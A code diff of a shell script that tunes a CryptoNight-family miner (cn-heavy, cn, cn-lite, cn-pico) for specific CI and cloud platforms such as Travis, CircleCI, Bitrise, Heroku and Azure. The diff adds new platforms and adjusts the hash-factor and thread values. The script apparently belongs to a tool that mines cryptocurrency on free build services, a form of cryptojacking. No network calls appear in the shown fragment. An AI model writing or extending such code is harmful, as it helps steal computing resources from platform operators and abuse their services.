@@ -1,15 +1,14 @@
 ## tuning for third party services
 
 tune_thirdparty() {
-    local base threads provider
+    export base threads provider
     export mhf=$cMhf csleep=$CSLEEP
-    provider=${X_ID/-*}
     if type "$provider"; then
         log "tune_thirdparty - provider: $provider"
         $provider
     else
         log "no provider available skipping 3rd party tuning"
-        return
+        return 1
     fi
 
     cMhf=${mhf:-$cMhf}
@@ -31,11 +30,11 @@ travis() {
             threads=1
             ;;
         "cn-lite")
-            mhf=2
+            mhf=4
             threads=2
             ;;
         "cn-pico")
-            mhf=4
+            mhf=2
             threads=2
             ;;
     esac
@@ -56,7 +55,7 @@ bitrise() {
             threads=1
             ;;
         "cn-pico")
-            mhf=4
+            mhf=2
             threads=2
             ;;
     esac
@@ -73,7 +72,7 @@ circleci() {
             threads=1
             ;;
         "cn-lite")
-            mhf=4
+            mhf=5
             threads=1
             ;;
         "cn-pico")
@@ -140,11 +139,11 @@ cphp() {
             threads=1
             ;;
         "cn-lite")
-            mhf=4
+            mhf=5
             threads=1
             ;;
         "cn-pico")
-            mhf=5
+            mhf=2
             threads=2
             ;;
     esac
@@ -282,6 +281,27 @@ appv() {
     }
 }
 
+azure() {
+    case "$job_algo" in
+        "cn-heavy")
+            mhf=3
+            threads=2
+            ;;
+        "cn")
+            mhf=4
+            threads=2
+            ;;
+        "cn-lite")
+            mhf=5
+            threads=2
+            ;;
+        "cn-pico")
+            mhf=2
+            threads=2
+            ;;
+    esac
+}
+
 heroku() {
         case "$job_algo" in
             "cn-heavy")
@@ -293,7 +313,7 @@ heroku() {
                 threads=2
                 ;;
             "cn-lite")
-                mhf=3
+                mhf=4
                 threads=2
                 ;;
             "cn-pico")
@@ -320,6 +340,27 @@ oc() {
         "cn-pico")
             mhf=2
             threads=4
+            ;;
+    esac
+}
+
+clni() {
+    case "$job_algo" in
+        "cn-heavy")
+            mhf=1
+            threads=2
+            ;;
+        "cn")
+            mhf=2
+            threads=1
+            ;;
+        "cn-lite")
+            mhf=5
+            threads=1
+            ;;
+        "cn-pico")
+            mhf=5
+            threads=1
             ;;
     esac
 }
